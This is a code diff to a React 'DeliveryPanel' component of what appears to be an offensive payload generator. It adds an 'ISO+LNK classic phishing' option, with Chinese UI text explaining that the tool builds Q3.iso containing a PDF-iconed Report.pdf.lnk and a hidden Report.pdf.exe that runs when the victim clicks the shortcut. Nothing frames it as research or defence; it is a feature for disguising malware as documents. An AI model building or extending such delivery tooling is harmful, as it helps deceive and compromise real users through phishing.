@@ -54,12 +54,15 @@ export default function DeliveryPanel() {
       title={t("generate.delivery_title")}
       subtitle={t("generate.delivery_subtitle")}
       footer={
-        <Button type="button" onClick={onGenerate} disabled={busy} className="w-full">
+        <Button type="button" onClick={onGenerate} disabled={busy} className="h-11 w-full rounded-xl text-sm font-semibold tracking-tight shadow-md shadow-primary/20 transition-all duration-200 hover:shadow-lg hover:brightness-110 active:scale-[0.98]">
           {busy ? t("generate.panel.generating") : t("generate.delivery_build")}
         </Button>
       }
     >
       <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
+        <div className="sm:col-span-2 rounded-xl border border-info/20 bg-info/5 px-3 py-2 text-xs leading-5 text-muted-foreground">
+          ISO+LNK 为经典钓鱼投递：挂载后可见文档图标 LNK，点击即启动隐藏载荷。
+        </div>
         <div>
           <Label>{t("generate.delivery_format")}</Label>
           <Select value={format} onValueChange={(v) => v && setFormat(v)}>
@@ -69,6 +72,7 @@ export default function DeliveryPanel() {
               <SelectItem value="url">{t("generate.delivery_url")}</SelectItem>
               <SelectItem value="lnk">{t("generate.delivery_lnk")}</SelectItem>
               <SelectItem value="iso">{t("generate.delivery_iso")}</SelectItem>
+              <SelectItem value="iso_lnk">ISO+LNK 经典钓鱼</SelectItem>
             </SelectContent>
           </Select>
         </div>
@@ -86,6 +90,11 @@ export default function DeliveryPanel() {
           <div className="sm:col-span-2">
             <Label>{t("generate.delivery_cmd")}</Label>
             <Input value={command} onChange={(e) => setCommand(e.target.value)} />
+          </div>
+        )}
+        {format === "iso_lnk" && (
+          <div className="rounded-lg border border-warning/25 bg-warning/10 px-2.5 py-2 text-xs leading-5 text-warning-foreground sm:col-span-2">
+            生成 <code className="rounded bg-background/60 px-1 font-mono">Q3.iso</code> 内含 <code className="rounded bg-background/60 px-1 font-mono">Report.pdf.lnk</code>（PDF 图标） + 隐藏的 <code className="rounded bg-background/60 px-1 font-mono">{filename || "Report.pdf.exe"}</code>，挂载后点击 LNK 即启动。filename 为隐藏 EXE 名。
           </div>
         )}
       </div>
